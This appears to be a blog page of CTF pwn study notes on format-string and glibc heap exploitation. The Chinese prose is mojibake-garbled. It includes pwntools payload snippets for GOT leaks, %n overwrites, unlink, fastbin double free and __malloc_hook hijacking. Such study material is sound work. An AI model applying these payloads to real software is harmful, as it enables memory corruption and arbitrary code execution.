<h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸºç¡€"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸºç¡€" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸºç¡€"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²åŸºç¡€</h2><p>åŸºæœ¬æ ¼å¼å¦‚ä¸‹ï¼š</p>
<p>$$<br>%[parameter] [flag] [field width] [.precision] [length] type</p>
<p>parameter</p>
<p>n$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°</p>
<p>flag</p>
<p>field width</p>
<p>è¾“å‡ºçš„æœ€å°å®½åº¦</p>
<p>precision</p>
<p>è¾“å‡ºçš„æœ€å¤§é•¿åº¦</p>
<p>lengthï¼Œè¾“å‡ºçš„é•¿åº¦</p>
<p>hhï¼Œè¾“å‡ºä¸€ä¸ªå­—èŠ‚</p>
<p>hï¼Œè¾“å‡ºä¸€ä¸ªåŒå­—èŠ‚</p>
<p>type</p>
<p>%d - åè¿›åˆ¶ - è¾“å‡ºåè¿›åˆ¶æ•´æ•°</p>
<p>%s - å­—ç¬¦ä¸² - ä»å†…å­˜ä¸­è¯»å–å­—ç¬¦ä¸²</p>
<p>%x - åå…­è¿›åˆ¶ - è¾“å‡ºåå…­è¿›åˆ¶æ•°</p>
<p>%c - å­—ç¬¦ - è¾“å‡ºå­—ç¬¦</p>
<p>%p - æŒ‡é’ˆ - æŒ‡é’ˆåœ°å€</p>
<p>%n - åˆ°ç›®å‰ä¸ºæ­¢æ‰€å†™çš„å­—ç¬¦æ•°payload &#x3D; p32(c_addr) + â€˜%012dâ€™ + â€˜%6$nâ€™<br>$$</p>
<h4 id="ç¨‹åºå´©æºƒï¼š"><a href="#ç¨‹åºå´©æºƒï¼š" class="headerlink" title="ç¨‹åºå´©æºƒï¼š"></a>ç¨‹åºå´©æºƒï¼š</h4><p>ç›´æ¥è¾“å…¥ ï¼Œå› ä¸ºä¸å¯èƒ½æ¯ä¸€ä¸ªéƒ½å¯¹åº”åˆæ³•åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%s%s%s%s%s%s%s%s%s%s%s%s%s%s </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æ³„éœ²å†…å­˜ï¼š</p>
<ul>
<li><p>æ³„éœ²æ ˆå†…å­˜</p>
<ul>
<li><p>è·å–æŸä¸ªå˜é‡çš„å€¼   %n$xå¾—åˆ°printfçš„ç¬¬n+1ä¸ªå‚æ•°çš„å€¼</p>
</li>
<li><p>è·å–æŸä¸ªå˜é‡å¯¹åº”åœ°å€çš„å†…å­˜</p>
</li>
<li><p>å°æŠ€å·§ï¼š</p>
<ol>
<li>åˆ©ç”¨ %x æ¥è·å–å¯¹åº”æ ˆçš„å†…å­˜ï¼Œä½†å»ºè®®ä½¿ç”¨ %pï¼Œå¯ä»¥ä¸ç”¨è€ƒè™‘ä½æ•°çš„åŒºåˆ«ã€‚</li>
<li>åˆ©ç”¨ %s æ¥è·å–å˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚</li>
<li>åˆ©ç”¨ %order$x æ¥è·å–æŒ‡å®šå‚æ•°çš„å€¼ï¼Œåˆ©ç”¨ %order$s æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”åœ°å€çš„å†…å®¹ã€‚</li>
</ol>
</li>
</ul>
</li>
<li><p>æ³„éœ²ä»»æ„åœ°å€å†…å­˜</p>
<ul>
<li><p>åˆ©ç”¨ GOT è¡¨å¾—åˆ° libc å‡½æ•°åœ°å€ï¼Œè¿›è€Œè·å– libcï¼Œè¿›è€Œè·å–å…¶å®ƒ libc å‡½æ•°åœ°å€</p>
</li>
<li><p>ç›²æ‰“ï¼Œdump æ•´ä¸ªç¨‹åºï¼Œè·å–æœ‰ç”¨ä¿¡æ¯</p>
</li>
<li><p>å†™æ³•ï¼š </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">sh = process(&#x27;./leakmemory&#x27;) </span><br><span class="line">leakmemory = ELF(&#x27;./leakmemory&#x27;) </span><br><span class="line">__isoc99_scanf_got=leakmemory.got[&#x27;__isoc99_scanf&#x27;] </span><br><span class="line">print hex(__isoc99_scanf_got) </span><br><span class="line">payload = p32(__isoc99_scanf_got) + &#x27;%4$s&#x27; </span><br><span class="line">print payload </span><br><span class="line">gdb.attach(sh) </span><br><span class="line">sh.sendline(payload) </span><br><span class="line">sh.recvuntil(&#x27;%4$s\n&#x27;) </span><br><span class="line">print hex(u32(sh.recv()[4:8])) # remove the  first bytes of __isoc99_scanf@got    sh.interactive() </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<h4 id="ï¼ï¼ï¼"><a href="#ï¼ï¼ï¼" class="headerlink" title="ï¼ï¼ï¼"></a>ï¼ï¼ï¼</h4><p>64ä½ç¨‹åºåç§»é‡è¦åŠ ä¸Š5</p>
<p>è¾“å‡ºåœ¨æ ˆä¸Šçš„æ•°æ®ï¼Œç›´æ¥è¾“å…¥â€%n$sâ€,nä¸ºè¯¥å‚æ•°ä¸¾ä¾‹printfè¾“å…¥ä½ç½®çš„åç§»,ä¸ç”¨åŠ ä¸Š5</p>
<h4 id="è¦†ç›–å†…å­˜"><a href="#è¦†ç›–å†…å­˜" class="headerlink" title="è¦†ç›–å†…å­˜"></a>è¦†ç›–å†…å­˜</h4><p>è¦æ±‚ï¼šå˜é‡å¯¹åº”çš„å†…å­˜å¯å†™</p>
<p>æ­¥éª¤ï¼š1.ç¡®å®šè¦†ç›–åœ°å€ 2.æ‰¾å‡ºç›¸å¯¹åç§» 3.è¿›è¡Œè¦†ç›–</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1752414359942.png" alt="1752414359942">è¦è®©cç­‰äº16ï¼Œcçš„åœ°å€å äº†4ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(c_addr) + &#x27;%012d&#x27; + &#x27;%6$n&#x27; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¦†å†™å¾ˆå°çš„åœ°å€ï¼šåŸå…ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²å¯¹åº”åç§»ä¸º6ï¼Œå³aa%8å ç¬¬å…­ä¸ªï¼Œï¿¥naaå ç¬¬ä¸ƒä¸ªï¼Œaçš„åœ°å€å äº†ç¬¬å…«ä¸ªï¼Œæ‰€ä»¥åç§»æ”¹ä¸º8ï¼šaa%8$naaå 8å­—èŠ‚ï¼Œint(2)&#x3D;8å­—èŠ‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;aa%8$naa&#x27; + p32(a_addr) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¦†å†™è¶…å¤§åœ°å€ï¼š åˆ©ç”¨ %hhn å‘æŸä¸ªåœ°å€å†™å…¥å•å­—èŠ‚ï¼Œåˆ©ç”¨ %hn å‘æŸä¸ªåœ°å€å†™å…¥åŒå­—èŠ‚ ï¼Œ%nå†™å…¥4å­—èŠ‚</p>
<p>èµ·å§‹åœ°å€0x0804A028ä¸ºè¦ä¿®æ”¹çš„å˜é‡ï¼Œä¾æ¬¡è¦†å†™å…¶å°ç«¯åºï¼Œå¦‚0x12345678ä¸º\x78\x56\x34\x12,pad1ä¸º\x78</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#x27;%6$hn&#x27;+pad2+&#x27;%7$hn&#x27;+pad3+&#x27;%8$hn&#x27;+pad4+&#x27;%9$hn&#x27; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="å¿«é€Ÿè®¡ç®—åç§»fmtarg"><a href="#å¿«é€Ÿè®¡ç®—åç§»fmtarg" class="headerlink" title="å¿«é€Ÿè®¡ç®—åç§»fmtarg"></a>å¿«é€Ÿè®¡ç®—åç§»fmtarg</h4><p>æ„ä¼šï¼š</p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1752416032454.png" alt="1752416032454"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gefâ¤  fmtarg 0x00007fffffffdb28 </span><br><span class="line">The index of format argument : 10 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>10-1&#x3D;9ï¼Œæ‰€ä»¥åç§»ä¸º9</p>
<h4 id="å‡½æ•°ï¼šfmtstr-payload"><a href="#å‡½æ•°ï¼šfmtstr-payload" class="headerlink" title="å‡½æ•°ï¼šfmtstr_payload"></a>å‡½æ•°ï¼šfmtstr_payload</h4><p><strong>buu axb_2019_fmt32 1</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def fmtstr_payload(offset, writes, write_size=&#x27;&#x27;, numbwritten=? )</span><br><span class="line">offser -&gt; åç§»é‡</span><br><span class="line">writes -&gt; è¦äº¤æ¢çš„åœ°å€ï¼Œç”¨å­—å…¸å½¢å¼</span><br><span class="line">wirte_size -&gt; é€byte/short/intå†™ </span><br><span class="line">numbwritten -&gt; printfå·²ç»è¾“å‡ºäº†å‡ ä¸ªå­—ç¬¦äº†</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨ï¼špayload1 = b&#x27;A&#x27; + fmtstr_payload(8,&#123;printf_got:system_addr&#125;,write_size=&#x27;byte&#x27;,numbwritten=0xa ï¼‰</span><br><span class="line">payload = fmtstr_payload(offeset, &#123;printf_got:sys_plt&#125;)  </span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="å †åŸºç¡€"><a href="#å †åŸºç¡€" class="headerlink" title="å †åŸºç¡€"></a>å †åŸºç¡€</h2><h4 id="åŸºç¡€æŠ€æœ¯"><a href="#åŸºç¡€æŠ€æœ¯" class="headerlink" title="åŸºç¡€æŠ€æœ¯"></a>åŸºç¡€æŠ€æœ¯</h4><p><strong>ç”³è¯·</strong></p>
<p><strong>calloc(0x20)ç­‰æ•ˆäºptr&#x3D;malloc(0x20),memset(ptr,0,0x20)</strong></p>
<p><strong>realloc:</strong><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1752332018064.png" alt="1752332018064"></p>
<h4 id="off-by-one"><a href="#off-by-one" class="headerlink" title="off-by-one"></a>off-by-one</h4><p>å…³é”®åœ¨äºæ€ä¹ˆéª—ï¼Œä¾‹å¦‚åœ¨roarctf_2019_easy_pwnï¼Œæœ‰ä¸ªåœ°æ–¹å­˜å‚¨ç€chunksizeç­‰ï¼Œé‚£ä¹ˆè¦æœ‰å§‹æœ‰ç»ˆï¼Œéª—å¾—chunkçš„sizeçš„pä½ä¸º1ï¼Œå…¶ä¸‹ä¸€chunk prevsize pä½ä¸º0</p>
<h4 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a><strong>unlink</strong></h4><p>1.å®æ–½çš„æ¡ä»¶ï¼š å…³é—­äº†PIEä¿æŠ¤ã€å…·æœ‰å †æº¢å‡ºã€çŸ¥é“å †å—æŒ‡é’ˆå­˜æ”¾åœ¨å“ªé‡Œ ï¼Œä¸”è¦é¿å¼€fastbinï¼Œå› ä¸ºfastbinä¸æ¶‰åŠchunkåˆå¹¶</p>
<p>2.æ€»ç»“ï¼š</p>
<p>å…ˆåˆ›é€ ä¸¤ä¸ªchunk aï¼Œb,åœ¨chunk açš„dateåŒºåŸŸç¼–å†™ä¸€ä¸ªæ–°chunkï¼Œå…¶ç»“æ„ä¸ºpayload&#x3D;p64(éšä¾¿)+p64(0x30)+p64(fd)+p64(bk)+bâ€™aâ€™*0x10+p64(0x30)+p64(0x90)</p>
<p>è‹¥å·²ç»™å‡ºä¸€ä¸ªæ•°ç»„sè®°å½•è¿™ä¸¤ä¸ªchunkçš„dateæŒ‡é’ˆï¼Œåˆ™fdæŒ‡çš„æ˜¯s-0x8ï¼ŒbkæŒ‡çš„æ˜¯sï¼Œæ­¤æ—¶freeï¼ˆchunk bï¼‰å¯ä»¥å°†æ•°ç»„sä¸­è®°å½•chunk açš„æŒ‡é’ˆæ”¹ä¸ºs-0x8ï¼Œæ­¤æ—¶å†ä¿®æ”¹chunk aï¼Œä¿®æ”¹çš„å°±æ˜¯s-0x8å¼€å§‹çš„æ•°æ®åŒºåŸŸ</p>
<p>å¾—åˆ°èƒ½å¤Ÿç¼–è¾‘å­˜å‚¨chunkæŒ‡é’ˆçš„ä½ç½®ï¼Œå¦‚<img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1752335838347.png" alt="1752335838347"></p>
<p>å›¾ä¸­0x602140å¼€å§‹æ—¶å­˜å‚¨æŒ‡å‘chunk dateåŒºåŸŸçš„åœ°å€ï¼Œé€šè¿‡æŸç§æ–¹å¼å¦‚unlinkä½¿å¾—ç¼–è¾‘è¯¥æ®µï¼Œå°†firstchunkæ”¹ä¸ºfreeåœ°å€ï¼Œsecondchunkæ”¹ä¸ºputsåœ°å€ï¼Œthirdchunkæ”¹ä¸ºatoiåœ°å€ï¼Œæ­¤æ—¶ä¿®æ”¹chunk1æ”¹çš„å°±æ˜¯freeçš„å†…å®¹ï¼ˆå‡ä¸ºgotæ ‡ä½ç½®ï¼‰ï¼Œè‹¥å°†å…¶æ”¹ä¸ºputs_pltï¼Œæ­¤æ—¶freeæ•ˆæœå°±å˜ä¸ºputsï¼Œfree(secondchunk)å˜ä¸ºputs(secondchunk)ä¹Ÿå°±æ˜¯puts(puts_got)ï¼Œæ­¤æ—¶å°±å¯ä»¥å°†atoiæ”¹ä¸ºsystemï¼Œå› ä¸ºatoiä¸ºå‘é€å­—ç¬¦å³å¯è§¦å‘ï¼Œæ­¤æ—¶å‘é€&#x2F;bin&#x2F;shåœ°å€å³å¯</p>
<h4 id="use-after-free"><a href="#use-after-free" class="headerlink" title="use after free"></a>use after free</h4><p>èŒƒå›´ï¼šå†…å­˜å—è¢«é‡Šæ”¾åï¼Œè¯¥<strong>æŒ‡é’ˆæ²¡æœ‰è¢«ç½®ä¸ºNULL</strong></p>
<p>é‡åˆ°çš„æƒ…å†µï¼šæ¯”å¦‚è¯´addæ­¥éª¤æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯æŒ‡å‘printfçš„åœ°å€å’Œå †contentçš„å†…å®¹ï¼Œä¸€ä¸ªå°±æ˜¯å…¶æœ¬èº«ï¼Œè¿˜å­˜åœ¨ä¸€ä¸ªsystemå‡½æ•°ï¼Œé‚£ä¹ˆå°†printfçš„ä½ç½®æ”¹ä¸ºsystemï¼Œè¿™æ ·å½“è°ƒç”¨printfæ—¶å°±ä¼šå˜æˆè°ƒç”¨systemï¼Œé‚£è¦æ€ä¹ˆæ”¹å‘¢ï¼Œåªè¦å°†ä¸¤ä¸ªchunkçš„å¤§å°è®¾ç½®ä¸ä¸€æ ·ï¼Œè¿™æ ·å½“deleteåï¼Œä¼šç›´æ¥å°†aï¼Œbçš„first_chunkå½’åˆ°ä¸€èµ·ï¼Œæ­¤æ—¶å†ç”³è¯·ä¸€ä¸ªå¤§å°ä¸first_chunkä¸€æ ·çš„chunkï¼Œå°±ä¼šå°†å…¶ä¸­ä¸€ä¸ªfirst_chunkå˜ä¸ºæ–°ç”³è¯·chunkçš„second_chunkï¼Œè¿™æ ·ä¿®æ”¹å…¶å†…å®¹ä¸ºsystemå³å¯è¾¾åˆ°æ•ˆæœ</p>
<h4 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h4><p>å½“å…¶next chunksizeè¦å°äºå…¶æœ€å¤§fast bin size,å…ˆè¿›åå‡º</p>
<p>å¤§å°ï¼š0x20~0x80</p>
<p>ä¸¤ä¸ªå‰æï¼š1.èƒ½å¤Ÿæ§åˆ¶chunkçš„å†…å®¹</p>
<p>â€‹                   2.æ¼æ´å‘ç”Ÿåœ¨fastbin chunkä¸­</p>
<p>å•é“¾é“¾æ¥ï¼Œæ‰€ä»¥æ²¡æœ‰bkï¼Œå…ˆè¿›åå‡º</p>
<p><strong>fastbin double free:é“¾è¡¨åªæ£€æŸ¥fdï¼Œä¸æ£€æŸ¥bk</strong></p>
<p>å…ˆç”³è¯·ä¸¤ä¸ªchunk aï¼Œbï¼Œç„¶åé‡Šæ”¾ä½¿å…¶è¿›å…¥fastbinï¼Œç„¶åå†æ¬¡é‡Šæ”¾aï¼Œè¿™æ ·açš„fdå°±æŒ‡å‘bï¼Œé“¾è¡¨ç»“æ„ï¼ša-&gt;b-&gt;aï¼Œå†æ¬¡ç”³è¯·ï¼Œå°†açš„fdæ”¹ä¸ºbss_addrï¼Œè¿™æ ·ï¼Œåœ¨ç”³è¯·ä¸€ä¸ªchunkå°±ä¼šæŠŠbè°ƒå‡ºæ¥ï¼Œå†æ¬¡è°ƒç”¨ï¼Œaå‡ºï¼Œè€Œaçš„fdæŒ‡å‘bssï¼Œè¿™æ ·å†æ¬¡ç”³è¯·å°±ä¼šä»bssä¸­è°ƒå‡º</p>
<p><strong>house of spirit</strong></p>
<p>é‡Šæ”¾æŒ‡å®šåœ°å€çš„chunk</p>
<p>äº”è¦æ±‚ï¼šismmapä½ä¸º0ï¼Œåœ°å€å¯¹é½ï¼ˆå¦‚pre_sizeæ‰€åœ¨ä½ç½®å¿…é¡»æ˜¯0xXXXX0æˆ–0xXXXX4ï¼‰,æ»¡è¶³è¿›å…¥fastbinè¦æ±‚ï¼Œé“¾è¡¨å¤´éƒ¨ä¸èƒ½æ˜¯fake chunkï¼Œå³ä¸èƒ½è¾¾æˆdouble free</p>
<p>æ ¸å¿ƒï¼šç¨‹åºç”³è¯·ä¸€ä¸ªchunkä¼šå…ˆæœ‰ä¸€ä¸ªpointï¼ŒæŒ‡å‘å…¶chunkçš„dateåŒºï¼Œè‹¥æ˜¯å¯ä»¥ä¿®æ”¹å…¶æŒ‡å‘å…¶ä»–åŒºï¼Œè¿™æ ·free(point)å›è¾¾åˆ°å°†fakechunkæ··å…¥fastbiné“¾è¡¨ä¸­ï¼›ä¹Ÿå¯å°†ä¸€ä¸ªå­˜å‚¨å„ä¸ªchunkçš„dateæŒ‡é’ˆçš„chunkfreeæ‰ï¼Œå†æ¬¡ç”³è¯·å°±å¯ä»¥ç¼–è¾‘è¿™ä¸ªchunk</p>
<p>å®ä¾‹ï¼šå°†pointæŒ‡å‘gotåœ°å€ï¼Œæ³„éœ²å‡ºæ¥å°±å¯ä»¥å¾—åˆ°libc_baseä»è€Œå¾—åˆ°systemå’Œbin_shåœ°å€</p>
<p><strong>alloc to stack</strong></p>
<p>chunkåœ¨è¢«freeåä¾ç„¶å¯ä»¥ä¿®æ”¹å…¶fdï¼Œä½¿å…¶ç”³è¯·çš„ç¬¬äºŒä¸ªchunkä¸ºæŒ‡å‘çš„æ ˆ</p>
<p><strong>arbitrary alloc</strong></p>
<p>ä¸alloc to stackä¸åŒåœ¨äºä¸€ä¸ªåˆ†é…åˆ°æ ˆä¸­ï¼Œä¸€ä¸ªåˆ†é…åˆ°å…¶å®ƒç¬¦åˆsizeçš„åŒºåŸŸï¼Œå¦‚ _malloc_hook çš„ä½ç½® </p>
<p><strong>å­—èŠ‚é”™ä½</strong></p>
<p>ä¸arbitrary allocç›¸å…³ï¼Œå› ä¸ºå…¶æ‰€æŒ‡å‘_malloc_hookçš„sizeä¸ç¬¦ï¼Œæ‰€ä»¥é€šè¿‡æŸ¥æ‰¾ _malloc_hookå‰é¢çš„åœ°å€æ¥é”™ä½</p>
<p>å¸¸è§„æŸ¥æ‰¾ï¼š</p>
<p>x&#x2F;20gx  _malloc_hook-0x48</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1a88 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1a90 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1a98 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1aa0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1aa8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0 </span><br><span class="line">0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0 </span><br><span class="line">0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0 </span><br><span class="line">0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0 </span><br><span class="line">0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è§‚å¯Ÿåˆ°åœ¨0x7ffff7dd1b08æ‰¾åˆ°0x7fï¼Œåœ¨fastbinä¸­å±äº0x70å—ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦malloc(0x60),è¿™æ ·å¯ä»¥è·å¾—ä¸€ä¸ª0x70çš„chunkï¼Œåœ°å€ä¸º0x7ffff7dd1b06ï¼Œæ­¤æ—¶å°†é’©å­æŒ‚åœ¨_malloc_hookä¸Šï¼Œåœ¨ç”³è¯·ä»»æ„åœ°å€çš„chunkå°±è§¦å‘äº†</p>
<p>å¿«é€ŸæŸ¥æ‰¾ï¼šmain_arenaä¸mallocç›¸å·®0x10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p &amp;main_arena</span><br><span class="line"></span><br><span class="line">x/4gx &amp;main_arena-0x10</span><br><span class="line"></span><br><span class="line">find_fake_fast addr size </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æŒ‚é’©å­ï¼šæ‰¾å‡ºé’©å­ï¼š one_gadget .&#x2F;libc.so.6 </p>
<p>å¾—åˆ°çš„é’©å­åœ°å€è¦åŠ ä¸Šlibc_baseï¼Œå°†å…¶å†™å…¥_malloc_hookä¸­ï¼Œæ­¤æ—¶mallocå³å¯è§¦å‘</p>
<h4 id="Unsortedbin-attack"><a href="#Unsortedbin-attack" class="headerlink" title="Unsortedbin attack"></a>Unsortedbin attack</h4><p><strong>ä½¿ç”¨æƒ…å†µ</strong>ï¼š1.å…ˆè¿›å…ˆå‡º(FIFO) </p>
<p>â€‹                    2.å½“mallocæ—¶ï¼Œä»fastbin,smallbin æ‰¾ä¸åˆ°å¯¹åº”sizeï¼Œä¼šä»unsortedbinä¸­æ‰¾ï¼Œè‹¥æ²¡æ‰¾åˆ°ï¼Œå°±ä¼šå°†                 unsortedbinä¸­chunkè¿”è¿˜åˆ°å„è‡ªbinä¸­(è‹¥unsortedbinä¸­chunksizeå¤§äºç”³è¯·çš„ï¼Œä¼šå°†å…¶åˆ†å‰²ï¼Œåˆ†å‰²å‰©ä½™éƒ¨åˆ†æ”¾å›unsortedbinä¸­ï¼Œå…¶ä½™chunkå„å›å„å®¶)</p>
<p><strong>æ€ä¹ˆleakï¼šæ³„éœ²å‡ºmain_arenaçš„åœ°å€</strong></p>
<p>**åˆå¹¶ï¼š**å…ˆç”³è¯·chunk a(0x18),b(0x10),c(0x60)åˆ©ç”¨å †æº¢å‡ºå°†bçš„sizeæ”¹ä¸º0x91,ç„¶åé‡Šæ”¾æ‰bï¼Œè¿™æ ·bè¢«é‡Šæ”¾çš„å¤§å°å°±å˜æˆäº†0x90,ç„¶åç”³è¯·0x10ï¼Œè¿™æ ·å°±ä¼šå°†åŸå…ˆçš„0x20åˆ†å‰²å‡ºæ¥ï¼ŒcåŸå…ˆçš„fdä½å°±æŒ‡å‘äº†main_arena+88ï¼Œå› ä¸ºæˆ‘ä»¬å¹¶æœªé‡Šæ”¾cï¼Œæ‰€ä»¥show(c)å°±okäº†</p>
<p>**åˆ†å‰²ï¼š**ç”³è¯·a(0x18),b(0x20),c(0x70)ï¼Œç„¶åä¿®æ”¹bä¸º0x91ï¼Œå†åœ¨cçš„åŒºåŸŸè®¾ç½®ä¸€ä¸ªfake_chunkä½¿å…¶prev-sizeä¸º0x90ï¼Œsizeä¸º0x41ï¼Œç„¶åé‡Šæ”¾æ‰chunkbï¼Œå†ç”³è¯·0x80ï¼Œè¿™æ ·å°±èƒ½å°†bçš„sizeçœŸçš„å˜æˆ0x91ï¼Œç„¶åé‡Šæ”¾cï¼Œshow(b),</p>
<p><strong>æ€ä¹ˆæ‰¾libc_base</strong>ï¼š</p>
<ol>
<li><p>æ–‡ä»¶æ”¾åˆ° IDA ä¸­ï¼Œæ‰¾åˆ° <code>malloc_trim</code> å‡½æ•°ï¼Œå°±å¯ä»¥è·å¾—åç§»äº†ã€‚ </p>
</li>
<li><p><code>main_arena</code> å’Œ <code>__malloc_hook</code> çš„åœ°å€å·®æ˜¯ 0x10 ï¼Œå³</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">main_arena_offset=ELF(&quot;libc.so.6&quot;).symbols[&quot;__malloc_hook&quot;] + 0x10 </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°å…¶åœ¨libcçš„ä½ç½®ï¼Œç›¸å‡å³å¯å¾—åˆ°libc_base</p>
</li>
</ol>
<p>**ä»€ä¹ˆæ—¶å€™ç”¨ï¼š**å°†ä¸€ä¸ªå…¨å±€å˜é‡è°ƒæ•´ä¸ºä¸€ä¸ªè¾ƒå¤§çš„å€¼</p>
<p>**corruptedï¼š**å½“è¢«é‡Šæ”¾chunkçš„bkæŒ‡é’ˆæŒ‡å‘å¦ä¸€ä¸ªåœ°å€æ—¶ï¼Œæ­¤æ—¶mallocè¯¥chunkåï¼ŒæŒ‡å‘çš„å¦ä¸€ä¸ªåœ°å€ä¼šæŒ‡å‘main_arena</p>
<p><strong>é¡µå¯¹é½è·å–libc_base</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">malloc_hook_addr = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + (malloc_hook_s &amp; 0xFFF)</span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>main_arena_88ä¸ºunsortedbinæ³„éœ²å‡ºçš„åœ°å€ï¼Œmalloc_hook_sä¸ºå…¶åœ¨libcçš„åœ°å€</p>
<p><strong>ä¸¾ä¾‹ï¼š</strong></p>
